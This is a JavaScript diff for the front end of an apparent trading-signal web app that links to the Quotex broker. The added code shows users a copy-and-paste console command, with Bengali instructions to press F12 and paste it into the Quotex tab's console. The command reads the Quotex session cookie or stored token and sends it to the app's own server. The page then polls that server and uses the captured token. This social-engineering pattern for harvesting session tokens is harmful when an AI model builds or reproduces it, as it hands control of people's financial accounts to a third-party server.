@@ -554,10 +554,32 @@ async function runQxAnalysis() {
     }
 }
 
-function quotexLogin() {
-    const statusText = document.getElementById('qxStatusText');
-    statusText.textContent = 'Opening Quotex login...';
+let _qxConnectId = null;
+let _qxPollTimer = null;
 
+async function quotexLogin() {
+    const statusText = document.getElementById('qxStatusText');
+    const dot = document.getElementById('qxDot');
+
+    // Step 1: Get a connect ID from our server
+    dot.className = 'qx-dot connecting';
+    statusText.textContent = 'Preparing...';
+
+    try {
+        const res = await fetch(`${API_BASE}/api/connect-id`);
+        const data = await res.json();
+        _qxConnectId = data.connect_id;
+    } catch (e) {
+        statusText.textContent = 'Server error. Try again.';
+        dot.className = 'qx-dot error';
+        return;
+    }
+
+    // Step 2: Build the console command that sends token back to our server
+    const serverUrl = API_BASE || window.location.origin.replace(/\/\/[^@]+@/, '//');
+    const cmd = `fetch('${serverUrl}/api/set-token?connect_id=${_qxConnectId}&token='+encodeURIComponent(document.cookie.match(/session=([^;]+)/)?.[1]||localStorage.getItem('token')||''))`;
+
+    // Step 3: Open Quotex login
     const popup = window.open(
         'https://market-qx.trade/en/sign-in',
         'quotex_login',
@@ -565,120 +587,134 @@ function quotexLogin() {
     );
 
     if (!popup) {
-        statusText.textContent = 'Popup blocked! Allow popups for this site.';
+        statusText.textContent = 'Popup blocked! Allow popups.';
+        dot.className = 'qx-dot error';
         return;
     }
 
-    const dot = document.getElementById('qxDot');
-    dot.className = 'qx-dot connecting';
-    statusText.textContent = 'Waiting for Quotex login...';
+    // Step 4: Show the token helper UI
+    _showConnectHelper(cmd);
 
-    // Monitor popup — when user closes it (after login), auto-connect
+    // Step 5: Start polling for token
+    _startTokenPolling();
+
+    // Step 6: Monitor popup close
     const checker = setInterval(() => {
         if (!popup || popup.closed) {
             clearInterval(checker);
-            statusText.textContent = 'Login detected! Connecting to Quotex...';
-            _autoConnectAfterLogin();
+            const st = document.getElementById('qxStatusText');
+            if (st && !window.qxBridge?.authenticated) {
+                st.innerHTML = st.innerHTML; // keep current helper text
+            }
         }
     }, 500);
 }
 
-function _autoConnectAfterLogin() {
-    const bridge = window.qxBridge;
-    if (!bridge) return;
-
+function _showConnectHelper(cmd) {
     const statusText = document.getElementById('qxStatusText');
+    const loginBtn = document.getElementById('quotexLoginBtn');
+    loginBtn.style.display = 'none';
 
-    // Set up onNeedToken callback — fires if cookie auth doesn't work
-    bridge.onNeedToken = () => {
-        _showTokenInput();
-    };
+    statusText.innerHTML =
+        '<span style="color:#ff9800;">Quotex-এ লগইন করুন</span>, তারপর Quotex ট্যাবে <b>F12</b> → <b>Console</b> → নিচের কোড পেস্ট করুন:';
 
-    // Step 1: Try fetching session from Quotex API (cookies sent automatically)
-    _tryFetchSession().then(token => {
-        if (token) {
-            statusText.textContent = 'Session found! Connecting...';
-            bridge.connect(token);
-        } else {
-            // Step 2: Try connecting with just cookies
-            statusText.textContent = 'Trying cookie-based connection...';
-            bridge.connectWithCookies();
+    let area = document.getElementById('qxTokenArea');
+    if (area) area.remove();
+
+    area = document.createElement('div');
+    area.id = 'qxTokenArea';
+    area.style.cssText = 'margin-top:8px;width:100%;';
+    area.innerHTML = `
+        <div style="display:flex;gap:6px;align-items:center;margin-bottom:8px;">
+            <code id="qxCmdCode" style="background:#1a2332;padding:6px 10px;border-radius:6px;font-size:0.72rem;color:#4fc3f7;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;border:1px solid #2d3d50;"
+                  title="Click to copy">${_escapeHtml(cmd)}</code>
+            <button id="qxCopyBtn" style="background:linear-gradient(135deg,#ff6b35,#ff8f00);color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-weight:600;font-size:0.82rem;white-space:nowrap;">
+                📋 Copy
+            </button>
+        </div>
+        <div style="display:flex;gap:6px;align-items:center;">
+            <span style="color:#8899aa;font-size:0.78rem;">অথবা ম্যানুয়ালি টোকেন পেস্ট করুন:</span>
+            <input type="text" id="qxTokenInput" placeholder="Session token paste করুন..."
+                   style="flex:1;background:#1a2332;border:1px solid #2d3d50;color:#e1e8ef;padding:6px 10px;border-radius:6px;font-size:0.82rem;">
+            <button id="qxTokenSubmit" style="background:linear-gradient(135deg,#00c853,#009624);color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-weight:600;font-size:0.82rem;">
+                Connect
+            </button>
+        </div>
+    `;
+    document.getElementById('qxBar').appendChild(area);
+
+    // Copy button
+    document.getElementById('qxCopyBtn').addEventListener('click', () => {
+        navigator.clipboard.writeText(cmd).then(() => {
+            const btn = document.getElementById('qxCopyBtn');
+            btn.textContent = 'Copied!';
+            btn.style.background = 'linear-gradient(135deg,#00c853,#009624)';
+            setTimeout(() => { btn.textContent = '📋 Copy'; btn.style.background = ''; }, 2000);
+        });
+    });
+
+    // Click code to copy too
+    document.getElementById('qxCmdCode').addEventListener('click', () => {
+        navigator.clipboard.writeText(cmd);
+        const el = document.getElementById('qxCmdCode');
+        el.style.borderColor = '#00c853';
+        setTimeout(() => { el.style.borderColor = '#2d3d50'; }, 1000);
+    });
+
+    // Manual token submit
+    document.getElementById('qxTokenSubmit').addEventListener('click', () => {
+        const token = document.getElementById('qxTokenInput').value.trim();
+        if (token) _connectWithToken(token);
+    });
+    document.getElementById('qxTokenInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            const token = document.getElementById('qxTokenInput').value.trim();
+            if (token) _connectWithToken(token);
         }
     });
 }
 
-async function _tryFetchSession() {
-    try {
-        // Try Quotex digest API — might return session if CORS allows
-        const res = await fetch('https://market-qx.trade/api/v1/cabinets/digest', {
-            credentials: 'include',
-            mode: 'cors',
-        });
-        if (res.ok) {
+function _startTokenPolling() {
+    if (_qxPollTimer) clearInterval(_qxPollTimer);
+    _qxPollTimer = setInterval(async () => {
+        if (!_qxConnectId) return;
+        try {
+            const res = await fetch(`${API_BASE}/api/get-token?connect_id=${_qxConnectId}`);
             const data = await res.json();
-            // Look for session token in response
-            if (data.session) return data.session;
-            if (data.token) return data.token;
+            if (data.token) {
+                clearInterval(_qxPollTimer);
+                _qxPollTimer = null;
+                _connectWithToken(data.token);
+            }
+        } catch (e) { /* ignore */ }
+    }, 2000);
+
+    // Stop polling after 5 minutes
+    setTimeout(() => {
+        if (_qxPollTimer) {
+            clearInterval(_qxPollTimer);
+            _qxPollTimer = null;
         }
-    } catch (e) {
-        console.log('QX: CORS blocked digest API (expected)');
-    }
-    return null;
+    }, 300000);
 }
 
-function _showTokenInput() {
-    const statusText = document.getElementById('qxStatusText');
-    const barRight = document.querySelector('.qx-bar-right');
-
-    statusText.innerHTML =
-        '<span style="color:#ff9800;">⚠ One more step needed!</span> ' +
-        'Open <a href="https://market-qx.trade/en/trade" target="_blank" style="color:#2196f3;">Quotex Trade Room</a>, ' +
-        'press <b>F12</b> → <b>Console</b> → paste this and press Enter:';
-
-    // Create input area for token
-    let inputArea = document.getElementById('qxTokenArea');
-    if (!inputArea) {
-        inputArea = document.createElement('div');
-        inputArea.id = 'qxTokenArea';
-        inputArea.style.cssText = 'display:flex;gap:6px;align-items:center;margin-top:6px;width:100%;';
-        inputArea.innerHTML = `
-            <code style="background:#1a2332;padding:4px 8px;border-radius:4px;font-size:0.75rem;color:#ff9800;cursor:pointer;white-space:nowrap;"
-                  onclick="navigator.clipboard.writeText(this.textContent);this.style.color='#00c853';"
-                  title="Click to copy">copy(document.cookie.match(/session=([^;]+)/)?.[1] || 'NOT FOUND')</code>
-            <input type="text" id="qxTokenInput" placeholder="Paste token here..."
-                   style="flex:1;background:#1a2332;border:1px solid #2d3d50;color:#e1e8ef;padding:6px 10px;border-radius:6px;font-size:0.82rem;min-width:180px;">
-            <button class="btn btn-connect" id="qxTokenSubmit" style="animation:none;padding:6px 12px;">Connect</button>
-        `;
-        const bar = document.getElementById('qxBar');
-        bar.appendChild(inputArea);
-
-        document.getElementById('qxTokenSubmit').addEventListener('click', () => {
-            const token = document.getElementById('qxTokenInput').value.trim();
-            if (token) {
-                const bridge = window.qxBridge;
-                bridge.connect(token);
-                inputArea.remove();
-            }
-        });
-
-        document.getElementById('qxTokenInput').addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                document.getElementById('qxTokenSubmit').click();
-            }
-        });
-    }
-
-    // Hide login button, show disconnect
-    document.getElementById('quotexLoginBtn').style.display = 'none';
-    document.getElementById('quotexConnectBtn').style.display = 'none';
-}
-
-function quotexConnect() {
+function _connectWithToken(token) {
     const bridge = window.qxBridge;
-    const token = document.getElementById('qxTokenInput')?.value?.trim();
-    if (token) {
-        bridge.connect(token);
-    }
+    if (!bridge) return;
+
+    // Clean up UI
+    const area = document.getElementById('qxTokenArea');
+    if (area) area.remove();
+    if (_qxPollTimer) { clearInterval(_qxPollTimer); _qxPollTimer = null; }
+
+    document.getElementById('qxStatusText').textContent = 'Connecting to Quotex...';
+    document.getElementById('qxDot').className = 'qx-dot connecting';
+
+    bridge.connect(token);
+}
+
+function _escapeHtml(str) {
+    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
 function quotexDisconnect() {
@@ -686,7 +722,7 @@ function quotexDisconnect() {
     if (bridge) bridge.disconnect();
     qxLiveMode = false;
     qxTickCount = 0;
-    // Clean up token input area if exists
+    if (_qxPollTimer) { clearInterval(_qxPollTimer); _qxPollTimer = null; }
     const tokenArea = document.getElementById('qxTokenArea');
     if (tokenArea) tokenArea.remove();
 }
